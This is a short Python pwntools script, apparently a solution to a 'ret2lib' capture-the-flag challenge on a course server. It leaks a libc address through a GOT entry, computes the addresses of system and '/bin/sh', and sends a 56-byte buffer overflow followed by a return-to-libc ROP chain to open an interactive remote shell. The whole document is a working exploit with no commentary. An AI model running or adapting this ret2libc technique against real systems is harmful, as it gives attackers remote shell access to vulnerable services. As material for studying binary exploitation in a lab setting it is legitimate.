from pwn import *

context.arch = 'amd64'

# host = '127.0.0.1'
# port = 8888
host = 'csie.ctf.tw'
port = 10127

r = remote(host, port)
# r = process('./ret2lib')

put_got = b'601018'

put_off = 0x6f690
system_off = 0x45390
bin_sh_off = put_off + 0x7ffff7b99d17 - 0x7ffff7a7c690  # should be 0x18cd17
pop_rdi_addr = 0x400823
ret_addr = 0x400541

# input('press enter')

r.recvuntil(':')
r.sendline(put_got)
r.recvuntil(':')
put_addr = int(r.recvuntil('\n'), 16)

system_addr = put_addr - put_off + system_off
bin_sh_addr = put_addr - put_off + bin_sh_off

r.recvuntil('?')
payload = b'a' * 56
payload += flat([pop_rdi_addr, bin_sh_addr, system_addr, ret_addr])
r.sendline(payload)

r.interactive()
